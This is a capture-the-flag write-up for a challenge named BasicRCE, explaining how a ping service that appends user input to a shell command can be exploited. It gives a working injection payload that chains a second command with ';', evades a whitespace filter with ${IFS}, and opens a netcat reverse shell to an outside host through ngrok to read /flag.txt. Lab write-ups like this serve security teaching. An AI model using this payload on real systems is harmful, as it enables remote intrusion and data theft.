# BasicRCE
## Description
This challenge is quite straightforward (the kind of exploit to use is in the title, after all).
The index page shows that the server will ping the URL sent by the user and shows only the return code of the ping command.
The ping command doesn't allow any redirects, and white spaces are blacklisted.
The flag is in the file /flag.txt

## Exploit
Although this is a blackbox, it's intuitive that the server concats the input string to the ping command, and then executes the new command in another thread.
This allows the user to execute any bash command on the server (as long as the server actually contains the binaries of that command), and there's many ways to exploit this.
An approach is to build a TCP tunnel between the local host and the challenge server, start a remote /bin/bash instance and interact with it, reading the /flag.txt file.
The payload is: ```www.google.com;nc${IFS}<ip_address>${IFS}<port_number>${IFS}-e${IFS}/bin/bash``` (it's recommended to use a TCP reverse proxy server, for example [ngrok](https://www.ngrok.com)).
This exploit will make the server execute the command ```ping -c 1 www.google.com``` successfully, and then execute ```nc``` immediately afterwards, opening the tunnel.
```${IFS}``` allows to escape the whitespace check.

### Steps to do
1. Boot up ngrok with ```ngrok tcp <random_port>```
2. Listen at the ngrok instance using ```nc -lvn <port_number>``` (the port number must be the same used for ngrok)
3. Find the IP address of the proxy
4. Write the payload and send it
5. If the connection has been established, it's now possible to send any command to the server via nc.
6. Grab the flag on /flag.txt
